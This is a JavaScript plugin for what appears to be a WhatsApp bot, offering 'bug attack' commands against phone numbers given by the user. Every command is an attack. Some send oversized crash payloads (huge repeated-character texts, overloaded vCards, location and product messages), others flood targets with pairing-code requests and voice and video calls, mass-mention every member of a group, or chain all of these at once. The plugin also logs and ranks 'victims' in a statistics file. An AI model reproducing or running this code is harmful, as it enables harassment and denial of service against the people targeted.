// Bug Commands Plugin - All Bug Attack Commands

const fs = require('fs');
const path = require('path');

class BugPlugin {
    constructor(config, client) {
        this.config = config;
        this.client = client;
        this.activeAttacks = new Map();
        this.attackLogs = [];
        this.victims = new Map();
        
        // Load attack statistics
        this.loadStats();
    }

    loadStats() {
        try {
            const statsPath = path.join(__dirname, '../bug_stats.json');
            if (fs.existsSync(statsPath)) {
                const stats = JSON.parse(fs.readFileSync(statsPath, 'utf8'));
                this.stats = stats;
            } else {
                this.stats = {
                    totalAttacks: 0,
                    victims: {},
                    lastAttack: null,
                    attacksPerDay: {}
                };
            }
        } catch (error) {
            console.error('Failed to load bug stats:', error);
            this.stats = {
                totalAttacks: 0,
                victims: {},
                lastAttack: null,
                attacksPerDay: {}
            };
        }
    }

    saveStats() {
        try {
            const statsPath = path.join(__dirname, '../bug_stats.json');
            fs.writeFileSync(statsPath, JSON.stringify(this.stats, null, 2));
        } catch (error) {
            console.error('Failed to save bug stats:', error);
        }
    }

    updateStats(target, attackType) {
        this.stats.totalAttacks++;
        this.stats.lastAttack = new Date().toISOString();
        
        const today = new Date().toISOString().split('T')[0];
        if (!this.stats.attacksPerDay[today]) {
            this.stats.attacksPerDay[today] = 0;
        }
        this.stats.attacksPerDay[today]++;
        
        if (!this.stats.victims[target]) {
            this.stats.victims[target] = {
                count: 0,
                attacks: [],
                firstAttack: new Date().toISOString()
            };
        }
        
        this.stats.victims[target].count++;
        this.stats.victims[target].attacks.push({
            type: attackType,
            time: new Date().toISOString()
        });
        
        this.saveStats();
    }

    async msgBlock(sock, msg, args, from, isGroup, sender, pushname, reply) {
        if (!args[0]) return reply("❌ *Error:* Target number required!\n📝 *Usage:* .msgblock [number]");
        
        const target = args[0].includes('@s.whatsapp.net') ? args[0] : args[0] + '@s.whatsapp.net';
        
        // Check if target is blocked
        if (this.activeAttacks.has(target)) {
            return reply(`⚠️ *Attack already active on ${target}!*`);
        }
        
        this.activeAttacks.set(target, { type: 'msgblock', startTime: Date.now() });
        
        try {
            await reply(`⚡ *Initializing MSG BLOCK Attack...*\n🎯 *Target:* ${target}\n💉 *Payload:* Critical\n\n_Sending attack payload..._`);
            
            const overload = "҈".repeat(60000);
            const payloads = [
                `*☣️ SYSTEM CRITICAL ERROR ☣️*\n${overload}`,
                `*⚠️ BUFFER OVERFLOW DETECTED ⚠️*\n${'🔴'.repeat(1000)}`,
                `*💀 FATAL SYSTEM ERROR 💀*\n${'☠️'.repeat(500)}`,
                `*🔥 MEMORY CORRUPTION 🔥*\n${'💢'.repeat(800)}`,
                `*⚡ STACK OVERFLOW ⚡*\n${'⚡'.repeat(600)}`
            ];
            
            for (let i = 0; i < 3; i++) {
                await sock.sendMessage(target, { 
                    text: payloads[i % payloads.length],
                    contextInfo: { 
                        externalAdReply: { 
                            title: "FATAL ERROR", 
                            body: "SYSTEM_TERMINATED", 
                            mediaType: 1, 
                            thumbnailUrl: this.config.logo 
                        } 
                    } 
                });
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            
            this.updateStats(target, 'msgblock');
            this.activeAttacks.delete(target);
            
            await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n📊 *Payloads Sent:* 3\n💀 *Status:* Successful`);
            
        } catch (error) {
            console.error('MsgBlock error:', error);
            this.activeAttacks.delete(target);
            await reply(`❌ *Attack Failed!*\n⚠️ *Error:* ${error.message}`);
        }
    }

    async pairSpam(sock, msg, args, from, isGroup, sender, pushname, reply) {
        if (!args[0]) return reply("❌ *Error:* Target number required!\n📝 *Usage:* .pairspam [number]");
        
        const target = args[0].replace(/[^0-9]/g, '');
        const count = args[1] ? parseInt(args[1]) : 50;
        
        if (count > 100) {
            return reply("⚠️ *Maximum 100 requests allowed!*");
        }
        
        await reply(`⚡ *Starting PAIRING SPAM Attack...*\n🎯 *Target:* ${target}\n📊 *Count:* ${count}\n\n_Sending ${count} pairing requests..._`);
        
        let success = 0;
        let failed = 0;
        
        for (let i = 0; i < count; i++) {
            try {
                await sock.requestPairingCode(target);
                success++;
                if (i % 10 === 0) {
                    await reply(`📊 *Progress:* ${i+1}/${count} requests sent`);
                }
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (e) {
                failed++;
                console.log(`Pair spam error: ${e.message}`);
            }
        }
        
        this.updateStats(target, 'pairspam');
        
        await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n✅ *Successful:* ${success}\n❌ *Failed:* ${failed}\n💀 *Status:* ${success > 0 ? 'Partial Success' : 'Failed'}`);
    }

    async callSpam(sock, msg, args, from, isGroup, sender, pushname, reply) {
        if (!args[0]) return reply("❌ *Error:* Target number required!\n📝 *Usage:* .callspam [number]");
        
        const target = args[0] + '@s.whatsapp.net';
        const count = args[1] ? parseInt(args[1]) : 20;
        
        if (count > 50) {
            return reply("⚠️ *Maximum 50 calls allowed!*");
        }
        
        await reply(`⚡ *Starting CALL SPAM Attack...*\n🎯 *Target:* ${target}\n📊 *Count:* ${count}\n\n_Initiating call requests..._`);
        
        let success = 0;
        
        for (let i = 0; i < count; i++) {
            try {
                await sock.offerCall(target, { isVideo: i % 2 === 0 });
                success++;
                await new Promise(resolve => setTimeout(resolve, 300));
            } catch (e) {
                console.log(`Call spam error: ${e.message}`);
            }
        }
        
        this.updateStats(target, 'callspam');
        
        await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n📞 *Calls Sent:* ${success}/${count}\n💀 *Status:* Attack Finished`);
    }

    async locationBug(sock, msg, args, from, isGroup, sender, pushname, reply) {
        if (!args[0]) return reply("❌ *Error:* Target number required!\n📝 *Usage:* .locationbug [number]");
        
        const target = args[0].includes('@s.whatsapp.net') ? args[0] : args[0] + '@s.whatsapp.net';
        const count = args[1] ? parseInt(args[1]) : 5;
        
        await reply(`⚡ *Starting LOCATION BUG Attack...*\n🎯 *Target:* ${target}\n📊 *Count:* ${count}\n\n_Sending location payloads..._`);
        
        for (let i = 0; i < count; i++) {
            await sock.sendMessage(target, {
                location: { 
                    degreesLatitude: -25.274398 + (Math.random() * 10), 
                    degreesLongitude: 133.775136 + (Math.random() * 10),
                    name: "💀 CHALAH VOID 404 💀".repeat(200),
                    address: "☠️ SYSTEM ERROR".repeat(200)
                }
            });
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        
        this.updateStats(target, 'locationbug');
        
        await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n📍 *Locations Sent:* ${count}\n💀 *Status:* Payload Delivered`);
    }

    async vCardBug(sock, msg, args, from, isGroup, sender, pushname, reply) {
        if (!args[0]) return reply("❌ *Error:* Target number required!\n📝 *Usage:* .vcardbug [number]");
        
        const target = args[0] + '@s.whatsapp.net';
        const overload = "☣️".repeat(20000);
        
        await reply(`⚡ *Starting VCARD BUG Attack...*\n🎯 *Target:* ${target}\n\n_Sending overloaded vCard..._`);
        
        const vcard = 'BEGIN:VCARD\n' + 
                      'VERSION:3.0\n' + 
                      'FN:CHALAH DESTROYER\n' + 
                      'ORG:VOID SYSTEM;\n' + 
                      'TEL;type=CELL;type=VOICE;waid=' + args[0] + ':+' + args[0] + '\n' + 
                      'NOTE:' + overload + '\n' + 
                      'EMAIL:destroyer@chalah.void\n' + 
                      'ADR:;;VOID SYSTEM;HELL;EARTH;;\n' + 
                      'URL:https://chalah.void\n' + 
                      'END:VCARD';

        await sock.sendMessage(target, { 
            contacts: { 
                displayName: 'CHALAH-BUG-SYSTEM', 
                contacts: [{ vcard }] 
            }
        });
        
        this.updateStats(target, 'vcardbug');
        
        await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n💳 *vCard Size:* ${(vcard.length / 1024).toFixed(2)} KB\n💀 *Status:* Overflow Attack Sent`);
    }

    async ghostBug(sock, msg, args, from, isGroup, sender, pushname, reply) {
        if (!args[0]) return reply("❌ *Error:* Target number required!\n📝 *Usage:* .ghostbug [number]");
        
        const target = args[0] + '@s.whatsapp.net';
        const ghost = "‎".repeat(50000);
        
        await reply(`⚡ *Starting GHOST BUG Attack...*\n🎯 *Target:* ${target}\n\n_Sending ghost messages..._`);
        
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: ghost + `💀 CHALAH GHOST ${i+1} 💀`,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true
                }
            });
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        
        this.updateStats(target, 'ghostbug');
        
        await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n👻 *Ghost Messages:* 3\n💀 *Status:* Hidden Payload Sent`);
    }

    async catalogBug(sock, msg, args, from, isGroup, sender, pushname, reply) {
        if (!args[0]) return reply("❌ *Error:* Target number required!\n📝 *Usage:* .catalogbug [number]");
        
        const target = args[0] + '@s.whatsapp.net';
        
        await reply(`⚡ *Starting CATALOG BUG Attack...*\n🎯 *Target:* ${target}\n\n_Sending catalog overflow..._`);
        
        await sock.sendMessage(target, {
            productMessage: {
                product: {
                    productId: '1234567890123456789012345678901234567890',
                    price: '9999999999',
                    currency: 'USD',
                    productImage: {
                        url: this.config.logo
                    }
                },
                businessOwnerJid: target,
                catalog: {
                    products: Array(100).fill({})
                }
            },
            caption: "SYSTEM OVERLOAD".repeat(1000)
        });
        
        this.updateStats(target, 'catalogbug');
        
        await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n📦 *Catalog Items:* 100\n💀 *Status:* Overflow Attack Sent`);
    }

    async destroyer(sock, msg, args, from, isGroup, sender, pushname, reply) {
        if (!isGroup) return reply("❌ *Error:* This command can only be used in groups!");
        
        const groupMetadata = await sock.groupMetadata(from);
        const participants = groupMetadata.participants.map(v => v.id);
        
        await reply(`⚡ *Starting GROUP DESTROYER Attack...*\n👥 *Members:* ${participants.length}\n\n_Mentioning all members..._`);
        
        const mentions = [];
        let mentionText = "☣️ *SYSTEM OVERLOAD INITIATED* ☣️\n\n";
        
        for (let i = 0; i < participants.length; i++) {
            mentionText += `@${participants[i].split('@')[0]}\n`;
            mentions.push(participants[i]);
            
            if ((i + 1) % 50 === 0) {
                await sock.sendMessage(from, {
                    text: mentionText,
                    mentions: mentions
                });
                mentionText = "";
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
        
        if (mentionText) {
            await sock.sendMessage(from, {
                text: mentionText,
                mentions: mentions
            });
        }
        
        this.updateStats(from, 'destroyer');
        
        await reply(`✅ *Attack Completed!*\n👥 *Members Mentioned:* ${participants.length}\n💀 *Status:* Group Destroyed`);
    }

    async multiBug(sock, msg, args, from, isGroup, sender, pushname, reply) {
        if (!args[0]) return reply("❌ *Error:* Target number required!\n📝 *Usage:* .multibug [number]");
        
        const target = args[0];
        
        await reply(`⚡ *Starting MULTI-BUG COMBO Attack...*\n🎯 *Target:* ${target}\n\n_Initiating all attack vectors..._`);
        
        // Run all attacks sequentially
        await this.msgBlock(sock, msg, [target], from, isGroup, sender, pushname, reply);
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        await this.pairSpam(sock, msg, [target, '30'], from, isGroup, sender, pushname, reply);
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        await this.locationBug(sock, msg, [target, '3'], from, isGroup, sender, pushname, reply);
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        await this.vCardBug(sock, msg, [target], from, isGroup, sender, pushname, reply);
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        await this.ghostBug(sock, msg, [target], from, isGroup, sender, pushname, reply);
        
        this.updateStats(target, 'multibug');
        
        await reply(`✅ *MULTI-BUG COMBO Completed!*\n🎯 *Target:* ${target}\n💀 *Attacks Used:* 5\n📊 *Status:* Full Attack Chain Executed`);
    }

    async bugStatus(sock, msg, args, from, isGroup, sender, pushname, reply) {
        const today = new Date().toISOString().split('T')[0];
        const todayAttacks = this.stats.attacksPerDay[today] || 0;
        
        const statusText = `
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃    📊 *BUG ATTACK STATISTICS* 📊
┃    ═══════════════════════════════
┃
┃  📈 *Total Attacks:* ${this.stats.totalAttacks}
┃  📅 *Today's Attacks:* ${todayAttacks}
┃  👥 *Total Victims:* ${Object.keys(this.stats.victims).length}
┃  ⏱️ *Last Attack:* ${this.stats.lastAttack || 'Never'}
┃  ⚡ *Active Attacks:* ${this.activeAttacks.size}
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃
┃  🎯 *TOP VICTIMS:*
┃  ${Object.entries(this.stats.victims)
        .sort((a, b) => b[1].count - a[1].count)
        .slice(0, 5)
        .map(([victim, data], i) => `  ${i+1}. ${victim.split('@')[0]} - ${data.count} attacks`)
        .join('\n┃  ') || '  No victims yet'}
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        `;
        
        await reply(statusText);
    }

    async stopAttack(sock, msg, args, from, isGroup, sender, pushname, reply) {
        if (this.activeAttacks.size === 0) {
            return reply("⚠️ *No active attacks found!*");
        }
        
        const count = this.activeAttacks.size;
        this.activeAttacks.clear();
        
        await reply(`✅ *Stopped ${count} active attack(s)!*`);
    }

    async execute(sock, msg, args, from, isGroup, sender, pushname, reply, command) {
        switch(command) {
            case 'msgblock':
                await this.msgBlock(sock, msg, args, from, isGroup, sender, pushname, reply);
                break;
            case 'pairspam':
                await this.pairSpam(sock, msg, args, from, isGroup, sender, pushname, reply);
                break;
            case 'callspam':
                await this.callSpam(sock, msg, args, from, isGroup, sender, pushname, reply);
                break;
            case 'locationbug':
                await this.locationBug(sock, msg, args, from, isGroup, sender, pushname, reply);
                break;
            case 'vcardbug':
                await this.vCardBug(sock, msg, args, from, isGroup, sender, pushname, reply);
                break;
            case 'ghostbug':
                await this.ghostBug(sock, msg, args, from, isGroup, sender, pushname, reply);
                break;
            case 'catalogbug':
                await this.catalogBug(sock, msg, args, from, isGroup, sender, pushname, reply);
                break;
            case 'destroyer':
                await this.destroyer(sock, msg, args, from, isGroup, sender, pushname, reply);
                break;
            case 'multibug':
                await this.multiBug(sock, msg, args, from, isGroup, sender, pushname, reply);
                break;
            case 'bugstatus':
                await this.bugStatus(sock, msg, args, from, isGroup, sender, pushname, reply);
                break;
            case 'stopattack':
                await this.stopAttack(sock, msg, args, from, isGroup, sender, pushname, reply);
                break;
            default:
                await reply(`❌ *Unknown bug command:* ${command}`);
        }
    }
}

module.exports = BugPlugin;
